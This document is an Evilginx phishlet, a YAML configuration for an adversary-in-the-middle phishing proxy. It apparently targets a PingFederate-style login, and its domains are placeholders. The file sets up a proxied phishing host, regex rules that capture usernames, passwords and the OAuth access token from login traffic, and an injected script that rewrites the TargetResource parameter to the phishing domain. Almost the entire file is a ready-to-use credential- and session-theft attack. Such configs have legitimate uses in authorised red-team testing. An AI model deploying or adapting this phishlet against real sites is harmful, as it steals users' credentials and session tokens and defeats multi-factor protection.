author: '@pingtechenablement'
min_ver: '3.0.0'
# Where Evilginx will redirect the user after creds and tokens are captured.
redirect_url: '<target_url>'
proxy_hosts:
- {phish_sub: '<target_sub>', orig_sub: '<target_sub>', domain: '<target_domain>', session: true, is_landing: true, auto_filter: true}
sub_filters:
auth_tokens:
- domain: '<auth_target_domain>'
  path: '/as/token.oauth2'
  name: 'token'
  search: '"access_token":"([^"]*)'
  type: 'body'
credentials:
  username:
    key: 'username'
    search: '"identifier":"([^"]*)'
    type: 'json'
  password:
    key: 'password'
    search: '"password":"([^"]*)'
    type: 'json'
login:
  domain: '<target_domain>'
  path: '/app'

# js_inject is ONLY needed if you need to extend Evilginx to handle bespoke use cases in your app.
js_inject:
- trigger_domains: ["<target_domain"]
  trigger_paths: ["/app/", "/*"]
  trigger_params: []
  script: "(function () {\n  var queryParams = new URLSearchParams(window.location.search);\n  if (queryParams.has('TargetResource')) {\n    const targetResource = queryParams.get('TargetResource');\n    if (targetResource?.includes('<target_domain>')) {\n      queryParams.set('TargetResource', targetResource.replace('<target_domain>', '<phishing_domain>'));\n      history.replaceState(null, null, \"?\" + queryParams.toString());\n    }\n  } \n})();\n"
